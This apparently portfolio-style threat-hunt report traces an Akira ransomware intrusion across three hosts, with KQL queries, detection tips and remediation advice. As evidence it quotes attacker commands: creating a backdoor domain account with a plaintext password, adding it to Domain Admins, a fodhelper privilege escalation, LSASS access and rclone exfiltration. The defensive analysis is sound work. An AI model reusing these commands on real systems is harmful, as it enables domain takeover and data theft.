Every backdoor resolves `cdn.cloud-endpoint.net` to Cloudflare edge IPs. On PC1 the channel ran from 02:25 to 09:23 at roughly 60-second intervals with jitter. On HL-FS01 it ran near-continuously during interactive work. `sync.cloud-endpoint.net` (same IPs) was used only by PowerShell for tool downloads. Two implants on ADDC01 (`taskhostw.exe` and `OneDriveSync.exe`) were still beaconing at the last events in the dataset.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | All three |
| Timestamp | 02:25:07 (first DNS) → 18:47:29 (last callback, ADDC01) |
| Process | rundll32.exe, taskhostw.exe, spoolsv.exe, OneDriveSync.exe, wsync.exe |
| DNS | `cdn.cloud-endpoint.net` → `104.21.30.237; 172.67.174.46` |
| Ports | 443 (915), 80 (579) on PC1 |

### 💡 Why it matters
The real server is hidden behind a CDN, so block by domain. The incident is an active domain controller compromise, not a finished ransomware event.

### 🔧 KQL Query Used
```kql
HarborlightDental_CL
| where EventID in (3, 22)
| where DestinationIp in ("104.21.30.237", "172.67.174.46") or QueryName has "cloud-endpoint.net"
| top 5 by EventTime desc
| project EventTime, host, Image, DestinationIp, DestinationPort, QueryName
```

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**  
Flag regular, low-variance connection intervals from non-browser processes to CDN ranges. After any ransomware event, run a last-callback query across every host before declaring containment.

</details>

---

<details>
<summary id="-section-13">🚩 <strong>Section 13: Persistence / Privilege Escalation (Again)</strong></summary>

### ❓ Questions Answered

| # | Question | Answer |
|---|----------|--------|
| Q1 | Attacker End Goal | **B**, durable domain-level persistence |
| Q2 | Is there a backdoor built into the domain itself? | `svc_sql`, `Summer2024!` |
| Q3 | Which privilege-escalation attempt actually worked? | `net localgroup Administrators svc_sql /add` (4732, 05:22:28) and `Add-ADGroupMember -Identity 'Domain Admins'` (4728, 05:22:57). The two `net group` attempts failed on quoting |
| Q4 | A second name shows up. Is it real? | Not real, only queried (`net user akira_svc /domain`), never created (no 4720 event) |

### 🎯 Objective
Keep access that survives host reimaging.

### 📌 Finding
After encryption, the attacker created `svc_sql / Summer2024!` and tried four ways to give it privileges. Only two produced group-change events. The attacker then looked up `akira_svc`, a ransomware-branded name that was never created. It's a decoy that pulls attention away from the real backdoor.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | ADDC01 |
| Timestamp | 05:21:56 (4720/4724/4722/4738), 05:22:28 (4732), 05:22:57 (4728), 05:23:28 (akira_svc lookup) |
| Process | net.exe / net1.exe, powershell.exe |
| Parent Process | spoolsv.exe |
| Command Line | `net user svc_sql Summer2024! /add /domain`; `powershell -c "Add-ADGroupMember -Identity 'Domain Admins' -Members svc_sql"` |

### 💡 Why it matters
`svc_sql` looks like an ordinary service account and has full Domain Admin rights. Chasing `akira_svc` would waste remediation effort while the real backdoor survives.

### 🔧 KQL Query Used
```kql
HarborlightDental_CL
| where EventCode in (4720, 4722, 4724, 4728, 4732, 4738, 4756)
| project EventTime, host, EventCode
| order by EventTime asc
```

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**  
Alert on every 4728/4732/4756 for privileged groups and on any 4720 not tied to an MSP change ticket.

</details>

---

<details>
<summary id="-section-14">🚩 <strong>Section 14: Impact (Encryption)</strong></summary>

### ❓ Questions Answered

| # | Question | Answer |
|---|----------|--------|
| Q1 | Final Playbook Stage | **B**, the visible impact: encryption and ransom |
| Q2 | What's the ransom note, and how many times does it land? | `akira_readme.txt`, 128 |
| Q3 | What's actually encrypted, and how do you know? | `.akira`, 27 |

### 🎯 Objective
The visible stage of the double extortion: encrypt and demand payment.

### 📌 Finding
`updater.exe` (Akira) ran on each host and dropped `akira_readme.txt` 128 times. Sysmon recorded 27 distinct `.akira` files across the estate (29 per-host events, two paths shared by ADDC01 and HL-FS01). The `System`-written `encryption_stats.txt.akira` on HL-FS01 shows PC1's encryptor also worked remotely over SMB. Akira also encrypted the phishing lure (`Harborlight_Insurance_Claims.7z.akira`) and `20260203185934_recon.zip` in `C:\Users\Public`, which looks like the attacker's own AD reconnaissance output.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | HL-FS01, ADDC01, BACKOFFICE-PC1 |
| Timestamp | 05:13:04 (FS01), 05:14:15 (DC), 05:17:32 (PC1) |
| Process | `C:\ProgramData\Microsoft\updater.exe` / `C:\Users\Public\updater.exe` |
| Parent Process | cmd.exe ← taskhostw.exe / spoolsv.exe / rundll32.exe |
| Command Line | `cmd /c updater.exe` |

### 💡 Why it matters
Akira renames files in place, and Sysmon EID 11 often doesn't capture renames. 27 is a confirmed minimum, not the full extent.

### 🔧 KQL Query Used
```kql
HarborlightDental_CL
| where EventID == 11 and TargetFilename endswith ".akira"
| summarize Hosts=make_set(host), Count=count() by TargetFilename
```

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**  
Alert on a burst of identically named `.txt` files created across many directories in seconds. Ransom-note drops are faster to detect than the encryption itself.

</details>

---

<details>
<summary id="-section-15">🚩 <strong>Section 15: Judgement</strong></summary>

### ❓ Questions Answered

| # | Question | Answer |
|---|----------|--------|
| Q1 | Can you put the whole chain in order? | initial access, execution, privilege escalation, credential access, lateral movement, exfiltration, impact |

### 🎯 Objective
Connect every proven stage into the attacker's playbook.

### 📌 Finding
The chain runs in the classic double-extortion order. Defence evasion and persistence aren't separate steps in that order. They recur throughout (notepad and spoolsv injection, log wipes, Run key and task, backup implants, `svc_sql`).

| Stage | Key evidence | Time (UTC) |
|---|---|---|
| Initial Access | `Vendor_Invoice_Review.7z` → ISO, emily.grant | 01:57 |
| Execution | `rundll32.exe D:\review.dll,StartW`; C2 from `E:\` | 01:59 / 02:25 |
| Privilege Escalation | fodhelper ms-settings hijack → `C:\Users\Public\taskhostw.exe` | 02:42 |
| Credential Access | spoolsv → lsass `0x1FFFFF` → `Emily.Grant / Dental2024!`; NTDS IFM dump | 03:31 / 04:33 |
| Lateral Movement | PC1 → HL-FS01 → ADDC01, WMI back down from the DC | 03:34 / 04:28 / 04:44 |
| Exfiltration | rclone as MsMpEng.exe → `mega:HARBORLIGHT-exfil` | 03:58 |
| Impact | Anti-recovery, Akira encryption on all three hosts | 04:04 / 05:13–05:17 |

### 🖼️ Screenshot
<Insert screenshot>

</details>

---

## 🚨 Detection Gaps & Recommendations

### Observed Gaps
- **No monitoring:** full Sysmon and Security logging existed, but nobody reviewed it and no alerts fired. The intrusion was found by staff reading ransom notes.
- **Flat network:** a single `/24` with no segmentation let a front-office workstation reach file-server and DC admin shares over SMB, RPC, and WMI.
- **Excessive privilege:** `Emily.Grant` had admin rights on HL-FS01 and ADDC01, contrary to the documented baseline.
- **Weak credential protection:** LSASS was readable (no RunAsPPL or Credential Guard), and passwords were passed in plaintext on command lines.
- **Print Spooler running on servers:** a SYSTEM service on the DC and file server was available as an injection host.
- **No egress control:** unrestricted outbound HTTPS to a CDN-fronted C2 and to MEGA.
- **Incomplete response:** the MSP's same-day response looked only at the workstation and AnyDesk, while the DC kept beaconing.

### Recommendations
- **Treat the domain as compromised:** isolate ADDC01; remove `svc_sql`; remove every implant (`C:\Users\Public\taskhostw.exe`, `OneDriveSync.exe`, `wsync.exe`, `updater.exe`, everything staged in `C:\ProgramData\Microsoft\` (Sections 9–11)); delete the `SecurityHealth` Run key and `WindowsUpdate` task; reset all domain passwords and **krbtgt twice**. Seriously consider rebuilding the domain.
- **Block** `*.cloud-endpoint.net` at DNS and egress; report it to Cloudflare; preserve `jwilson.vhr@proton.me` and `mega:HARBORLIGHT-exfil` for law enforcement and MEGA.
- **Network segmentation:** separate workstation, server, and tier-0 (DC) zones, and allow SMB/WMI/RPC to servers only from management hosts.
- **Least privilege:** remove local admin rights from front-office accounts, and use tiered admin accounts and LAPS.
- **Harden credentials:** enable LSA Protection and Credential Guard, and disable the Print Spooler on DCs and non-print servers.
- **Detection content:** deploy alerts for the hunting tips in Sections 1–14, especially spoolsv child processes, LSASS access, `ntdsutil ifm`, shadow-copy deletion, `wevtutil cl`, and privileged group changes.
- **Recovery and breach handling:** check whether the Windows Server Backup catalog on HL-FS01 survived (the `wbadmin` step misfired), keep offline/immutable backups, and start breach-notification assessment for the exfiltrated patient data.

---

## 🧾 Final Assessment

This was a capable, hands-on-keyboard Akira affiliate operation. It used signed Windows binaries and renamed tools throughout, injected into a SYSTEM service on every host, took the domain within about three hours of the first click, and completed the double-extortion playbook: exfiltration, recovery inhibition, then encryption. The attacker also anticipated the response, with a Domain Admin backdoor created after encryption, a ransomware-branded decoy account, redundant implants, and staggered log wipes. Harborlight's posture (flat network, an over-privileged user, unmonitored logs) offered little resistance. The most important finding is that **the incident was still active when the data ended**. Restoring files without rebuilding trust in the domain would leave the attacker in place.

---

## 📎 Analyst Notes

- Report structured for interview and portfolio review  
- Evidence reproducible via advanced hunting  
- Techniques mapped directly to MITRE ATT&CK  
- **Noise and MSP tooling ruled out:** the legitimate `C:\Windows\System32\taskhostw.exe` (path is the discriminator); Credential Manager reads (EventCode 5379, constant before and after the attack); AnyDesk (installed before the intrusion, active from 01:08, used by the `helpdesk` account at 13:50 as part of the MSP's response); svchost mDNS on 5353; Windows maintenance tasks (PcaPatchSdbTask, EdgeUpdate, Windows Update); the 7-Zip installer; and two 4738 events exactly six hours apart (00:16 / 06:16).
- **Telemetry caveats:** many Log Analytics exports capped at 1,000 rows, so timing conclusions were based on `summarize` queries. Process-access fields had to be extracted from `EventData_Xml`. The 04:42:28 WMIC command line records `/node:172.16.0.7`, while its network events go to `.8` and `.109`, a discrepancy in the telemetry.
- **Clarifications to earlier case answers:** spoolsv injection activity was ultimately seen on all three hosts (EID 8 confirmed on PC1 and FS01, spoolsv-driven commands on ADDC01). `wsync.exe` lives at `C:\ProgramData\Microsoft\wsync.exe` and was dropped by `C:\Users\Public\taskhostw.exe`. The 4728 event is logged at 05:22:57 (the command launched at 05:22:54).

---
